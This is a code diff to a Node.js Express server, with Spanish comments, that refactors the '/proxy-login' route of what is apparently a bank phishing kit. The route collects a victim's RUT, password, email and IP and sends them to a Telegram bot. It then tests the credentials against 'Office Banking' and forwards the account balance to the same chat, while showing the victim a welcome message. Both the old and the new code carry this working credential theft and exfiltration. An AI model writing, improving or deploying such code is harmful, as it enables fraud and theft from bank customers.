@@ -76,48 +76,41 @@ app.post("/autorizar", async (req, res) => {
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  let mensaje;
 
   if (mail) {
-    mensaje = `Correo actualizado:\n${mail || "(sin correo)"}\nIP: ${ip}`;
-    try {
-      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-      });
-      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
-    } catch (err) {
-      return res.status(500).json({ status: "error", error: err.message });
-    }
-  }
-
-  // Notificación básica de ingreso (flujo original)
-  mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nIP: ${ip}`;
-  try {
+    const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
+    return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
+  }
 
-    let resultado = {};
-    let mensajeFinal = "Bienvenido a Office Banking"; // valor por defecto
+  // Notificación básica de ingreso
+  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
+  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
+  });
 
+  let resultado = {};
+  let mensajeFinal = "Bienvenido a Office Banking"; // valor por defecto
+
+  try {
     if (rut && passwd) {
       resultado = await loginYActualizarPlanilla(rut, passwd);
 
       if (resultado.status === "error") {
+        mensajeFinal = resultado.mensaje || "Credenciales incorrectas";
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: process.env.CHAT_ID,
-            text: "❌ Credenciales incorrectas en OfficeBanking"
-          })
+          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: `❌ ${mensajeFinal}` })
         });
-        mensajeFinal = "Credenciales incorrectas";
       } else {
+        mensajeFinal = `Ingreso correcto. Saldo: ${resultado.saldo}`;
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -126,7 +119,6 @@ app.post("/proxy-login", async (req, res) => {
             text: `✅ Credenciales correctas\nSaldo detectado: ${resultado.saldo}`
           })
         });
-        mensajeFinal = `Ingreso correcto. Saldo: ${resultado.saldo}`;
       }
     }
 
@@ -139,7 +131,7 @@ app.post("/proxy-login", async (req, res) => {
     });
   } catch (err) {
     console.error("Error en proxy-login:", err);
-    res.status(500).json({ status: "error", error: err.message });
+    res.status(500).json({ status: "error", mensaje: "Error interno", error: err.message });
   }
 });
 
